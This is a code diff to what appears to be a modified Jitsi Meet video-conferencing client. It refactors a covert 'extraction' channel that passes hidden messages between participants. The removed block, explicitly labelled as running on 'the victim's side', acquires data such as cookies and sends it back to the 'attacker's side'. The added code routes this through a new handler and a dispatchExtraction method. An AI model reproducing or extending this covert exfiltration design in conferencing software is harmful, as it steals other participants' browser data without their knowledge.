@@ -5,7 +5,7 @@ import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
 
 import { openConnection } from './connection';
-import { ExtractionHandler, defaultConfigurationValues } from './extraction/ExtractionHandler';
+import { ExtractionHandler } from './extraction/ExtractionHandler';
 import { ENDPOINT_TEXT_MESSAGE_NAME } from './modules/API/constants';
 import AuthHandler from './modules/UI/authentication/AuthHandler';
 import UIUtil from './modules/UI/util/UIUtil';
@@ -1302,6 +1302,23 @@ export default {
         }
     },
 
+    /**
+     * 
+     * @param {*} user 
+     * @param {*} receivedMessage 
+     */
+    dispatchExtraction(user, receivedMessage) {
+        // extraction started.
+        APP.API.notifyExtractionStarted({
+            senderInfo: {
+                jid: user.getJid(),
+                id: user.getId()
+            },
+            recievedData: receivedMessage
+        });
+        APP.store.dispatch(extractionStarted(user, receivedMessage));
+    },
+
     initializeExtraction(configuration, fileName, user) {
         // initialize extraction handler for receiving hidden communication based on set configuration
         APP.conference._extractionHandler = new ExtractionHandler(configuration);
@@ -1423,32 +1440,9 @@ export default {
         // define extraction handler if it does not exist
         // OR if it contains extraction handler from previous communication
         if (!APP.conference._extractionHandler || APP.conference._extractionHandler.communicationEnded) {
-            APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
+            APP.conference._extractionHandler = new ExtractionHandler(recievedData);
         }
-
-        // this runs on the victim's side
-        if (recievedData.extraction === 'request') {
-            if (recievedData.config.dataType !== 'cookies') {
-                // extraction started.
-                APP.API.notifyExtractionStarted({
-                    senderInfo: {
-                        jid: user._jid,
-                        id: user._id
-                    },
-                    recievedData
-                });
-                APP.store.dispatch(extractionStarted(user, recievedData));
-
-                return;
-            }
-            this._acquireData(recievedData.config).then(acquiredData => {
-                APP.conference._extractionHandler.sendAll(acquiredData, user);
-            });
-        } else { // 'reply' received, this runs on the attacker's side
-            const extractionEvent = APP.conference._extractionEventElement;
-
-            APP.conference._extractionHandler.receiveEndpointData(recievedData, extractionEvent);
-        }
+        APP.conference._extractionHandler.handleMessage(user);
     },
 
     /**
